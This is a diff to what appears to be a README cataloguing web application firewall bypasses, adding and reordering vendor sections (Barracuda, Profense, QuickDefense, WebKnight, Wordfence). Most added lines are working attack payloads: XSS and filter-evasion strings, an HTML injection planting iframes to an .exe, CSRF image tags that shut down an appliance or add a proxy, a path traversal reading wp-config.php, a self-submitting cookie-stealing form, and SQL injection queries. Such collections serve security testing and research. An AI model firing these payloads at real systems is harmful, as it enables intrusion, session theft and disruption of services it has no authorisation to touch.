@@ -2126,9 +2126,29 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 - On [Pastebin](https://pastebin.com)  
 `site:pastebin.com +<wafname> bypass`
 
-## Known Bypasses: `Incomplete`
+## Known Bypasses:
+### Barracuda 
+- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
+```
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+```
+- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
+```
+GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
+Host: favoritewaf.com
+User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
+```
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+```
+<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
+```
+- [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
+- [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
+
 ### Citrix NetScaler
-- HTTP Parameter Pollution (NS10.5) [@BGA Security](https://www.exploit-db.com/?author=7396)
+- SQLi via HTTP Parameter Pollution (NS10.5) [@BGA Security](https://www.exploit-db.com/?author=7396)
 ```
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
@@ -2167,27 +2187,7 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 0 union/**/select 1,version(),@@datadir
 ```
 
-### Barracuda 
-- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
-```
-<body style="height:1000px" onwheel="alert(1)">
-<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
-<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
-```
-- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
-```
-GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
-Host: favoritewaf.com
-User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
-```
-- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
-```
-<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
-```
-- [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
-- [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
-
-### __DotDefender__
+### DotDefender
 - Firewall disable by (v5.0) by [@hyp3rlinx](http://hyp3rlinx.altervista.org)
 ```
 PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
@@ -2254,7 +2254,7 @@ h%2Bn)(/0wn3d/.source)" />
 /?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{ 
 ```
 
-### __Fortinet Fortiweb__
+### Fortinet Fortiweb
 - `pcre_expression` unvaidated XSS by [@Benjamin Mejri](https://www.exploit-db.com/?author=7854)
 ```
 /waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
@@ -2330,7 +2330,7 @@ state=%2527+and+
 BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
 ```
 
-### __Imperva SecureSphere__
+### Imperva SecureSphere
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
 - XSS Bypass by [@Alra3ees](https://twitter.com/alra3ees)
 ```
@@ -2360,7 +2360,36 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 ```
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
-### __WebKnight__ 
+### Profense
+- [GET Type CSRF Attack](https://www.exploit-db.com/exploits/7919) by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
+
+Turn off Proface Machine 
+```
+<img src=https://host:2000/ajax.html?action=shutdown>
+```
+Add a proxy
+```
+<img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&vhost=vhost.com&vhost_port=80&rhost_proto=http&rhost=10.1.1.1&rhost_port=80&mode_pass=on&xmle=on&enable_file_upload=on&static_passthrough=on&action=add&do=save>
+```
+
+- XSS Bypass by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
+```
+https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<script>alert(document.cookie)</script>
+```
+- [XSS Bypass](https://www.securityfocus.com/bid/35053/info) by [@EnableSecurity](https://enablesecurity.com) (>= v2.4)
+```
+%3CEvil%20script%20goes%20here%3E=%0AByPass
+%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E 
+```
+
+### QuickDefense
+- XSS Bypass by [@WAFNinja](https://waf.ninja/)
+```
+?<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle=alert(1)>
+```
+
+### WebKnight
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
 ```
 <isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
@@ -2375,11 +2404,29 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 0 union(select 1,@@hostname,@@datadir)
 ```
 
-### __QuickDefense__ 
-- Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
+### Wordfence
+- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v) (>= v7.1)
 ```
-?<input type="search" onsearch="aler\u0074(1)">
-<details ontoggle=alert(1)>
+<a/href=javascript&colon;alert()>click
+```
+- [HTML Injection](https://www.securityfocus.com/bid/69815/info) by [@Voxel](https://www.exploit-db.com/?author=8505)
+```
+http://host/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+```
+- [XSS Exploit](https://www.securityfocus.com/bid/56159/info) by [@MustLive](https://www.exploit-db.com/?author=1293) (>= v3.3.5)
+```
+<html>
+<head>
+<title>Wordfence Security XSS exploit (C) 2012 MustLive. 
+http://websecurity.com.ua</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack" action="http://site/?_wfsf=unlockEmail" method="post">
+<input type="hidden" name="email" 
+value="<script>alert(document.cookie)</script>">
+</form>
+</body>
+</html>
 ```
 
 ### __Apache__ 
@@ -2515,6 +2562,7 @@ X-Remote-Addr: 127.0.0.1
 - [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
 - [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
 - [Beyond SQLi - Obfuscate and Bypass WAFs](papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.
+- [Bypassing WAF XSS Detection Mechanisms](papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf) - A research paper about bypassing XSS detection mechanisms in WAFs. 
 
 ### Presentations:
 - [Methods to Bypass a Web Application Firewall](presentrations/Methods%20To%20Bypass%20A%20Web%20Application%20Firewall.pdf) - A presentation from [PT Security](https://www.ptsecurity.com) about bypassing WAF filters and evasion.
